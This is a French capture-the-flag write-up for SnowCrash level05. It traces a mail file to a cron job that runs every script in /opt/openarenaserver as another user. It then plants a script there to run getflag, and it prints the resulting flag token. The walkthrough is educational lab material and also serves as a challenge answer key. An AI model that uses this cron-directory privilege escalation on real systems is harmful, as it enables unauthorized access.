Dés que l'on arrive sur le level05 on a un message :
-- You have new mail. --

On comprend qu'il y aura une affaire avec les mails.

Je lance donc :

-- level05@SnowCrash:~$ find / -name mail 2>/dev/null
** Sortie :
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail


Dans l'ordre je vois le premiers:
/usr/lib/byobu/mail

Mais rien d'exploitable ou interressant.

Je vais donc regarder le deuxième :

-- cd /var/mail --
-- ls -la -- 
** Sortie :
level05
**

Yes on avance, on a un fichier mail pour le level05.

Je vais donc regarder le contenu de ce fichier :

-- cat level05 --
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
**

On comprend que le fichier mail est un fichier de configuration pour le cron.
Il y a une tache cron qui s'execute toutes les 2 minutes et qui execute la commande :
su -c "sh /usr/sbin/openarenaserver" - flag05

On va donc regarder le contenu de /usr/sbin/openarenaserver :

-- cat /usr/sbin/openarenaserver --

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

On comprend que le script execute tous les fichiers dans /opt/openarenaserver.
Il execute chaque fichier avec un timeout de 5 secondes.
Il supprime ensuite le fichier.

On va donc créer un fichier dans /opt/openarenaserver pour executer la commande getflag.

-- echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05 --
-- chmod +x /opt/openarenaserver/flag05 --

On attend 2 minutes et on regarde le contenu de /tmp/flag05 :

viuaaale9huek52boumoomioc
